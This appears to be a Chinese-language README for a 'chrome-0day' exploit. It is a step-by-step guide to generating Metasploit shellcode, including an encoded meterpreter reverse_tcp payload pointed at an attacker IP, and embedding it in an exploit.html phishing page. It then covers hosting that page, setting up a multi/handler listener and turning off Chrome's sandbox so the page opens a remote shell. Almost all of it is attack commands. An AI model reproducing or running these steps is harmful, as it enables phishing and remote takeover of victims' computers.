# chrome-0day
### 生成shellcode代码

#### 弹出计算器的shellcode生成命令：

```msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num```

*（当然也可以换成其他系统命令）*

### 制作html钓鱼文件


将生成的代码放入explo.html中shellcode[]中。

#### 方式一

浏览器关闭沙盒并打开网页

```
chrome.exe --no-sanbox /path/to/exploit.html
```
#### 方式二

在攻击机当前目录下用python或kali自带的apache2开启一个http服务。

python3.x版本：

```python3 -m http.server 80```

python2.x版本：

```python -m SimpleHttpServer 80```

apache2

sudo systemctl start apache2


http://127.0.0.1/path/to/exploit.html

### 利用msf反弹shell

#### msf反弹shell的shenllcode生成命令：

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.232 LPORT=5555 -e x86/shikata_ga_nai -b "\x00" -i 15 -f num -o payload.c```

**注意：LHOST要和自己本机ip保持一致，LPORT要和接下来监听的端口也保持一致**

将生成的payload.c文件中全部内容填入exploi.html中shellcode[]里。
#### msfconsole监听

执行命令：

```
msfconsole

msf6>use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.43.232

msf6 exploit(multi/handler) > set LPORT 5555

msf6 exploit(multi/handler) > run

```

然后记得关闭沙盒后打开使用Chrome浏览器访问exploit.html即可成功反弹shell。


### 关闭沙盒方法：

**命令方式：**

chrome.exe --no-sandbox

**手动方式：**

在快捷方式属性中目标后面添加" --no-sandbox",

![image](https://user-images.githubusercontent.com/41281045/115229381-90421f80-a145-11eb-97ad-04f84bcd1784.png)



















